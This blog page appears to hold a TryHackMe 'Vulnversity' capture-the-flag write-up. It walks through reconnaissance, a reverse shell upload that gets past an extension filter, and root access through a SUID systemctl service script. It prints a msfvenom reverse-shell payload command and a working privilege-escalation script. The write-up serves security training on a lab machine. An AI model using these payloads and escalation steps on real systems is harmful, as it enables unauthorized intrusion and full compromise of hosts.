<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"/><meta charSet="utf-8"/><title>/dev/blog - TryHackMe - Vulnversity</title><meta name="description" content="Learn about active recon, web app attacks and privilege escalation."/><link rel="icon" href="/favicon.ico"/><meta name="next-head-count" content="5"/><link rel="preload" href="/_next/static/css/d206db58d2194450.css" as="style"/><link rel="stylesheet" href="/_next/static/css/d206db58d2194450.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-5cd94c89d3acac5f.js"></script><script src="/_next/static/chunks/webpack-69bfa6990bb9e155.js" defer=""></script><script src="/_next/static/chunks/framework-1f10003e17636e37.js" defer=""></script><script src="/_next/static/chunks/main-fc7d2f0e2098927e.js" defer=""></script><script src="/_next/static/chunks/pages/_app-43ac001d99fedbd3.js" defer=""></script><script src="/_next/static/chunks/814-5321687895e5b29b.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bpath%5D-4279e18e005f30e3.js" defer=""></script><script src="/_next/static/MnC4eJ4ih-P5gsZqaS6Kc/_buildManifest.js" defer=""></script><script src="/_next/static/MnC4eJ4ih-P5gsZqaS6Kc/_ssgManifest.js" defer=""></script><script src="/_next/static/MnC4eJ4ih-P5gsZqaS6Kc/_middlewareManifest.js" defer=""></script></head><body><div id="__next"><header class="p-6 sm:px-12 md:px-24 lg:px-48 xl:px-60 2xl:px-96"><nav class="flex flex-row"><a href="/"><h1 class=" text-4xl font-extrabold tracking-tight sm:text-5xl md:text-6xl">/dev/blog</h1></a><ul class="flex flex-row flex-grow items-end justify-evenly"><a href="/posts"><li class="underline">Posts</li></a><a href="/notes"><li class="">Notes</li></a></ul></nav></header><main class="flex justify-center p-6 sm:px-12 md:px-24 lg:px-48 xl:px-60 2xl:px-96"><article class="max-w-full grow flex flex-col justify-self-start"><blockquote><p class="mb-2 inline text-sm sm:text-base xl:text-lg">The room link can be found at<!-- -->
<!-- --><a title="" class="text-secondary-700 visited:text-secondary-900 font-bold hover:underline" href="https://tryhackme.com/room/vulnversity">TryHackMe - Vulnversity<!-- --></a></p></blockquote><h2 class="mb-4 text-3xl font-bold tracking-tight sm:text-4xl md:text-5xl">Reconnaissance<!-- --></h2><h3 class="mb-4 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl">Nmap<!-- --></h3><p class="mb-2 inline text-sm sm:text-base xl:text-lg">First, we do a simple Nmap scan<!-- --></p><pre class="overflow-auto"><code>PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3128/tcp open  squid-http
3333/tcp open  dec-notes
<!-- --></code></pre><p class="mb-2 inline text-sm sm:text-base xl:text-lg">We find six ports open, we can now make a more in-depth scan with<!-- -->
<!-- -->nmap -sC -sV $IP<!-- -->. It will found the service type and version.<!-- --></p><pre class="overflow-auto"><code>PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: 0s
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2020-09-02T14:44:45-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-09-02T18:44:46
|_  start_date: N/A
<!-- --></code></pre><p class="mb-2 inline text-sm sm:text-base xl:text-lg">From the OpenSSH version we can find out that the os type is Ubuntu Linux.<!-- --></p><h3 class="mb-4 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl">Gobuster<!-- --></h3><p class="mb-2 inline text-sm sm:text-base xl:text-lg">There is an HTTP port open on <!-- -->3333<!-- --> so we can start enumerating it.<!-- --></p><pre class="overflow-auto"><code>gobuster dir -w GitHub/SecLists/Discovery/Web-Content/big.txt -u http://10.10.232.204:3333/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.232.204:3333/
[+] Threads:        10
[+] Wordlist:       GitHub/SecLists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/02 20:52:40 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/internal (Status: 301)
/js (Status: 301)
/server-status (Status: 403)
===============================================================
2020/09/02 20:56:58 Finished
===============================================================
<!-- --></code></pre><p class="mb-2 inline text-sm sm:text-base xl:text-lg">We can see various pages. Visiting them we find that on <!-- -->/internal<!-- --> there is an<!-- -->
<!-- -->upload form.<!-- --></p><p class="mb-2 inline text-sm sm:text-base xl:text-lg">If we run gobuster again on this path we can find a second directory<!-- -->
<!-- -->/internal/uploads/<!-- -->.<!-- --></p><h2 class="mb-4 text-3xl font-bold tracking-tight sm:text-4xl md:text-5xl">Exploitation<!-- --></h2><h3 class="mb-4 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl">Compromise the webserver<!-- --></h3><p class="mb-2 inline text-sm sm:text-base xl:text-lg">We start by generating our reverse shell. I chose to use a meterpreter reverse<!-- -->
<!-- -->shell.<!-- --></p><pre class="overflow-auto"><code>msfvenom --payload php/meterpreter/reverse_tcp  LHOST=$USER_IP LPORT=$PORT &gt; payload.php
<!-- --></code></pre><p class="mb-2 inline text-sm sm:text-base xl:text-lg">Let<!-- -->’<!-- -->s also start the Metasploit console with an <!-- -->exploit/multi/handler<!-- -->.<!-- --></p><p class="mb-2 inline text-sm sm:text-base xl:text-lg">Unfortunately if we try to upload it the extension is blocked. If we try the<!-- -->
<!-- -->extensions provided in the image from the challenge, we find that one works. We<!-- -->
<!-- -->can find the uploaded file in the <!-- -->/internal/uploads/<!-- --> directory that we found<!-- -->
<!-- -->before.<!-- --></p><p class="mb-2 inline text-sm sm:text-base xl:text-lg">We now have a shell on the box.<!-- --></p><p class="mb-2 inline text-sm sm:text-base xl:text-lg">Now we background the session and use the <!-- -->post/linux/gather/enum_system<!-- --> to<!-- -->
<!-- -->enumerate the system information, including the user accounts. With the <!-- -->loot<!-- -->
<!-- -->command, we can list the gathered items, and at the end of there user list, we<!-- -->
<!-- -->have the <!-- --><strong>bill<!-- --></strong> user. In his home directory, we can find the user flag which<!-- -->
<!-- -->is readable by <!-- -->www-data<!-- --> (our user).<!-- --></p><h3 class="mb-4 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl">Privilege escalation<!-- --></h3><p class="mb-2 inline text-sm sm:text-base xl:text-lg">To gather more information about the box, we can use the <!-- -->upload<!-- --> command to<!-- -->
<!-- -->upload the<!-- -->
<!-- --><a title="" class="text-secondary-700 visited:text-secondary-900 font-bold hover:underline" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">linPEAS<!-- --></a>
<!-- -->script. This will list all the interesting information on the box, including the<!-- -->
<!-- -->SUID binaries. Une of them sticks out, the <!-- -->systemctl<!-- --> executable that bad since<!-- -->
<!-- -->we can execute and change the state of all the services on the machine without<!-- -->
<!-- -->root privilege. We look up<!-- -->
<!-- --><a title="" class="text-secondary-700 visited:text-secondary-900 font-bold hover:underline" href="https://gtfobins.github.io/gtfobins/systemctl/">systemctl | GTFOBins<!-- --></a> to find<!-- -->
<!-- -->an easy way to exploit it.<!-- --></p><pre class="overflow-auto"><code>#!/bin/sh

TF=$(mktemp).service
echo &#x27;[Service]
Type=oneshot
ExecStart=/bin/sh -c &quot;cat /root/root.txt &gt; /tmp/output&quot;
[Install]
WantedBy=multi-user.target&#x27; &gt; $TF
systemctl link $TF
systemctl enable --now $TF
<!-- --></code></pre><p class="mb-2 inline text-sm sm:text-base xl:text-lg">This script will create a temp service file, link, enable, and run it. The<!-- -->
<!-- -->service will be run as root and will cat the flag into the tmp directory that is<!-- -->
<!-- -->readable for us. We could also run a meterpreter reverse shell to gain a root<!-- -->
<!-- -->shell on the box.<!-- --></p></article></main></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"article":{"title":"TryHackMe - Vulnversity","tags":["CTF","THM"],"description":"Learn about active recon, web app attacks and privilege escalation.","language":null,"content":[{"Start":"BlockQuote"},{"Start":"Paragraph"},{"Text":"The room link can be found at"},"SoftBreak",{"Start":{"Link":["Inline","https://tryhackme.com/room/vulnversity",""]}},{"Text":"TryHackMe - Vulnversity"},{"End":{"Link":["Inline","https://tryhackme.com/room/vulnversity",""]}},{"End":"Paragraph"},{"End":"BlockQuote"},{"Start":{"Heading":["H2",null,[]]}},{"Text":"Reconnaissance"},{"End":{"Heading":["H2",null,[]]}},{"Start":{"Heading":["H3",null,[]]}},{"Text":"Nmap"},{"End":{"Heading":["H3",null,[]]}},{"Start":"Paragraph"},{"Text":"First, we do a simple Nmap scan"},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"nmap"}}},{"Text":"PORT     STATE SERVICE\n21/tcp   open  ftp\n22/tcp   open  ssh\n139/tcp  open  netbios-ssn\n445/tcp  open  microsoft-ds\n3128/tcp open  squid-http\n3333/tcp open  dec-notes\n"},{"End":{"CodeBlock":{"Fenced":"nmap"}}},{"Start":"Paragraph"},{"Text":"We find six ports open, we can now make a more in-depth scan with"},"SoftBreak",{"Code":"nmap -sC -sV $IP"},{"Text":". It will found the service type and version."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"nmap"}}},{"Text":"PORT     STATE SERVICE     VERSION\n21/tcp   open  ftp         vsftpd 3.0.3\n22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)\n|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)\n|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)\n139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)\n3128/tcp open  http-proxy  Squid http proxy 3.5.12\n|_http-server-header: squid/3.5.12\n|_http-title: ERROR: The requested URL could not be retrieved\n3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Vuln University\nService Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: 0s\n|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: \u003cunknown\u003e, NetBIOS MAC: \u003cunknown\u003e (unknown)\n| smb-os-discovery:\n|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)\n|   Computer name: vulnuniversity\n|   NetBIOS computer name: VULNUNIVERSITY\\x00\n|   Domain name: \\x00\n|   FQDN: vulnuniversity\n|_  System time: 2020-09-02T14:44:45-04:00\n| smb-security-mode:\n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode:\n|   2.02:\n|_    Message signing enabled but not required\n| smb2-time:\n|   date: 2020-09-02T18:44:46\n|_  start_date: N/A\n"},{"End":{"CodeBlock":{"Fenced":"nmap"}}},{"Start":"Paragraph"},{"Text":"From the OpenSSH version we can find out that the os type is Ubuntu Linux."},{"End":"Paragraph"},{"Start":{"Heading":["H3",null,[]]}},{"Text":"Gobuster"},{"End":{"Heading":["H3",null,[]]}},{"Start":"Paragraph"},{"Text":"There is an HTTP port open on "},{"Code":"3333"},{"Text":" so we can start enumerating it."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"gobuster dir -w GitHub/SecLists/Discovery/Web-Content/big.txt -u http://10.10.232.204:3333/\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.232.204:3333/\n[+] Threads:        10\n[+] Wordlist:       GitHub/SecLists/Discovery/Web-Content/big.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/09/02 20:52:40 Starting gobuster\n===============================================================\n/.htaccess (Status: 403)\n/.htpasswd (Status: 403)\n/css (Status: 301)\n/fonts (Status: 301)\n/images (Status: 301)\n/internal (Status: 301)\n/js (Status: 301)\n/server-status (Status: 403)\n===============================================================\n2020/09/02 20:56:58 Finished\n===============================================================\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"We can see various pages. Visiting them we find that on "},{"Code":"/internal"},{"Text":" there is an"},"SoftBreak",{"Text":"upload form."},{"End":"Paragraph"},{"Start":"Paragraph"},{"Text":"If we run gobuster again on this path we can find a second directory"},"SoftBreak",{"Code":"/internal/uploads/"},{"Text":"."},{"End":"Paragraph"},{"Start":{"Heading":["H2",null,[]]}},{"Text":"Exploitation"},{"End":{"Heading":["H2",null,[]]}},{"Start":{"Heading":["H3",null,[]]}},{"Text":"Compromise the webserver"},{"End":{"Heading":["H3",null,[]]}},{"Start":"Paragraph"},{"Text":"We start by generating our reverse shell. I chose to use a meterpreter reverse"},"SoftBreak",{"Text":"shell."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"msfvenom --payload php/meterpreter/reverse_tcp  LHOST=$USER_IP LPORT=$PORT \u003e payload.php\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"Let"},{"Text":"’"},{"Text":"s also start the Metasploit console with an "},{"Code":"exploit/multi/handler"},{"Text":"."},{"End":"Paragraph"},{"Start":"Paragraph"},{"Text":"Unfortunately if we try to upload it the extension is blocked. If we try the"},"SoftBreak",{"Text":"extensions provided in the image from the challenge, we find that one works. We"},"SoftBreak",{"Text":"can find the uploaded file in the "},{"Code":"/internal/uploads/"},{"Text":" directory that we found"},"SoftBreak",{"Text":"before."},{"End":"Paragraph"},{"Start":"Paragraph"},{"Text":"We now have a shell on the box."},{"End":"Paragraph"},{"Start":"Paragraph"},{"Text":"Now we background the session and use the "},{"Code":"post/linux/gather/enum_system"},{"Text":" to"},"SoftBreak",{"Text":"enumerate the system information, including the user accounts. With the "},{"Code":"loot"},"SoftBreak",{"Text":"command, we can list the gathered items, and at the end of there user list, we"},"SoftBreak",{"Text":"have the "},{"Start":"Strong"},{"Text":"bill"},{"End":"Strong"},{"Text":" user. In his home directory, we can find the user flag which"},"SoftBreak",{"Text":"is readable by "},{"Code":"www-data"},{"Text":" (our user)."},{"End":"Paragraph"},{"Start":{"Heading":["H3",null,[]]}},{"Text":"Privilege escalation"},{"End":{"Heading":["H3",null,[]]}},{"Start":"Paragraph"},{"Text":"To gather more information about the box, we can use the "},{"Code":"upload"},{"Text":" command to"},"SoftBreak",{"Text":"upload the"},"SoftBreak",{"Start":{"Link":["Inline","https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS",""]}},{"Text":"linPEAS"},{"End":{"Link":["Inline","https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS",""]}},"SoftBreak",{"Text":"script. This will list all the interesting information on the box, including the"},"SoftBreak",{"Text":"SUID binaries. Une of them sticks out, the "},{"Code":"systemctl"},{"Text":" executable that bad since"},"SoftBreak",{"Text":"we can execute and change the state of all the services on the machine without"},"SoftBreak",{"Text":"root privilege. We look up"},"SoftBreak",{"Start":{"Link":["Inline","https://gtfobins.github.io/gtfobins/systemctl/",""]}},{"Text":"systemctl | GTFOBins"},{"End":{"Link":["Inline","https://gtfobins.github.io/gtfobins/systemctl/",""]}},{"Text":" to find"},"SoftBreak",{"Text":"an easy way to exploit it."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"#!/bin/sh\n\nTF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"cat /root/root.txt \u003e /tmp/output\"\n[Install]\nWantedBy=multi-user.target' \u003e $TF\nsystemctl link $TF\nsystemctl enable --now $TF\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"This script will create a temp service file, link, enable, and run it. The"},"SoftBreak",{"Text":"service will be run as root and will cat the flag into the tmp directory that is"},"SoftBreak",{"Text":"readable for us. We could also run a meterpreter reverse shell to gain a root"},"SoftBreak",{"Text":"shell on the box."},{"End":"Paragraph"}]}},"__N_SSG":true},"page":"/posts/[path]","query":{"path":"writeups_tryhackme_vulnversity"},"buildId":"MnC4eJ4ih-P5gsZqaS6Kc","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>